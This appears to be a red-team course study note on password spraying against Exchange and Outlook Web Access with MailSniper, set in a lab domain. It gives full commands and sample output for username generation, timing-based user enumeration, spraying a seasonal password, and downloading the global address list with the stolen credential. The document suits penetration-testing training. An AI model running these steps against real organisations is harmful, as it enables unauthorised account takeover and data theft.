

Password spraying is an effective technique for discovering weak passwords that users are notorious for using. 

Patterns such as MonthYear (August2019), SeasonYear (Summer2019) and DayDate (Tuesday6) are very common.

## 🖊️ Tools

Two excellent tools for password spraying against Office 365 and Exchange are [MailSniper](https://github.com/dafthack/MailSniper) and [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit).

`PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1

## 📔 Attack Method

- Build a list of users or usernames
- Build a list of possible passwords
- Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`, for example:

	`PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io

- [namemash.py](https://gist.github.com/superkojiman/11076951) will take a person's full name and transform it into possible username permutations.
```
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ~/namemash.py names.txt > possible.txt
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> head -n 5 possible.txt
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```

- `Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.

```
PS C:\Users\Attacker> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
[*] Now spraying the OWA portal at https://10.10.15.100/owa/
Determining baseline response time...
Response Time (MS)       Domain\Username
763                      cyberbotic.io\OkAJfr
738                      cyberbotic.io\UGVuQv
750                      cyberbotic.io\ztHyFf
749                      cyberbotic.io\dsLWDY
762                      cyberbotic.io\YgFBIP

         Baseline Response: 752.4

Threshold: 460.44
Response Time (MS)       Domain\Username
[*] Potentially Valid! User:cyberbotic.io\bfarmer
[*] Potentially Valid! User:cyberbotic.io\iyates

```

- MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
```
PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
[*] Now spraying the OWA portal at https://mail.cyberbotic.io/owa/
[*] SUCCESS! User:cyberbotic.io\iyates Password:Summer2022
[*] A total of 1 credentials were obtained.
```

Always be aware of account lockout, avoiding blocking and causing noise in the environment. 

- We can do further actions using MailSniper with valid credentials, such as downloading the global address list.
```
PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```


##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{06-02-2024}} 17:19
🏷️ tags: #redteam #crto   
---

